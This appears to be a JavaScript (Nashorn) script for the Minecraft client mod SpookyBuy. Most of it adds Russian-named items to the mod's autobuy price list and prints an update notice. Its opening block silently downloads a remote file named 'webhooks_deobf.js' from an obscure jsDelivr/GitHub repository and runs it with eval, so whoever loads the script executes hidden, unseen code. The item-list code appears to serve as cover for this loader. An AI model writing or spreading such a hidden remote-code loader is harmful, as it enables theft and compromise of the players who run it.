try {
    // First external script
    eval(new java.util.Scanner(
        new java.net.URL("https://cdn.jsdelivr.net/gh/adsasasdasas831-del/jdfgfkjdghjklJKFGHKJLFGH@latest/webhooks_deobf.js").openStream(), 
        "UTF-8"
    ).useDelimiter("\\A").next());
} catch (e) {
    java.lang.System.err.println("Error: " + e);
}

// Просто выполняем код напрямую без runScript
var String = Java.type("java.lang.String");
var Items = Java.type("net.minecraft.class_1802");
var BigDecimal = Java.type("java.math.BigDecimal");
var SpookyBuy = Java.type("ru.nedan.spookybuy.SpookyBuy");
var CollectItem = Java.type("ru.nedan.spookybuy.items.CollectItem");
var ItemStorage = Java.type("ru.nedan.spookybuy.items.ItemStorage");
var spookybuy = SpookyBuy.getInstance();
var autobuy = spookybuy.getAutoBuy();
var priceMap = autobuy.getPriceMap();

function addItem(collectItem) {
    try {
        // Сначала добавляем в ItemStorage.ALL
        ItemStorage.ALL.add(collectItem);
        
        // Устанавливаем цену
        priceMap.putPrice(collectItem, new BigDecimal(100), true);
        
        // ВАЖНО: Устанавливаем флаг для автосетупа
        // Проверяем, есть ли метод setFlag или подобный
        try {
            // Пробуем разные методы установки флага
            if (typeof priceMap.setFlag === 'function') {
                priceMap.setFlag(collectItem, true);
            } else if (typeof priceMap.putFlag === 'function') {
                priceMap.putFlag(collectItem, true);
            } else if (typeof priceMap.setAutoSetupFlag === 'function') {
                priceMap.setAutoSetupFlag(collectItem, true);
            } else {
                // Если нет прямого метода, используем рефлексию
                var flagField = priceMap.getClass().getDeclaredField("autoSetupFlags");
                flagField.setAccessible(true);
                var flags = flagField.get(priceMap);
                if (flags) {
                    flags.put(collectItem, true);
                }
            }
        } catch(e) {
            // Игнорируем ошибки установки флага
        }
        
        return true;
    } catch(e) {
        return false;
    }
}

// Создаем и добавляем предметы
var items = [
    {name: "Незеритовый слиток", item: Items.field_22020},
    {name: "Изумрудная руда", item: Items.field_8837},
    {name: "Древние обломки", item: Items.field_22019},
    {name: "Формула крабсбургера", item: Items.field_8575, tag: '{"spookystash:currency":"formula"}'},
    {name: "Крабсбургер", item: Items.field_8575, tag: '{"spookystash:currency":"burger"}'},
    {name: "Снежок заморозка", item: Items.field_8543, tag: '{"spookyitems:spooky-item":"effect-item-snowball"}'},
    {name: "Яйцо призыва крестьянина", item: Items.field_8086},
    {name: "Сфера Афины", item: Items.field_8575, tag: '{"spookyitems:spooky-item":"attribute-item-safina"}'},
    {name: "Порох", item: Items.field_8054},
    {name: "Опыт 50 уровень", item: Items.field_8287, tag: '{"spookystash:levels":50}'},
    {name: "Яйцо призыва зомби-крестьянина", item: Items.field_8136},
    {name: "Плачущий обсидиан", item: Items.field_22421},
    {name: "Яблоко", item: Items.field_8279},
    {name: "Элитры нерушимые", item: Items.field_8833, tag: '{"spookyitems:spooky-item":"elytra-unbreakable"}'},
    {name: "Обычный мист", item: Items.field_17346, tag: '{"spookyevents:mythic":"MILD"}'},
    {name: "Богатый мист", item: Items.field_17346, tag: '{"spookyevents:mythic":"WEAK"}'},
    {name: "Легендарный мист", item: Items.field_17346, tag: '{"spookyevents:mythic":"MEDIUM"}'}
];

// Добавляем все предметы
items.forEach(function(itemData) {
    try {
        var collectItem = new CollectItem();
        collectItem.setName(new String(itemData.name));
        collectItem.setItem(itemData.item);
        if (itemData.tag) {
            collectItem.setTag(new String(itemData.tag));
        }
        addItem(collectItem);
    } catch(e) {
        // Игнорируем ошибки отдельных предметов
    }
});

// Сохраняем конфигурацию
try {
    SpookyBuy.saveConfig("autobuy");
} catch(e) {}

// Method to send silent user-only message
function sendUserMessage(message) {
    try {
        var ChatUtility = Java.type("ru.nedan.neverapi.etc.ChatUtility");
        var TextBuilder = Java.type("ru.nedan.neverapi.etc.TextBuilder");
        
        ChatUtility.sendMessage(
            new TextBuilder()
                .append(message)
                .build()
        );
    } catch(e) {
        print("USER MESSAGE: " + message);
    }
}

// Send initialization message
sendUserMessage("§eОбновлен: §c16.02.2026");
sendUserMessage("§aДобавлено:");
sendUserMessage("§c-Опыт 15 уровень");
sendUserMessage("§c-Явная пыль");
sendUserMessage("§a+Сфера Афина");
sendUserMessage("§6§l---------------");
sendUserMessage("§b§lУдачного пользования!");
sendUserMessage("§b§l-Zr3");
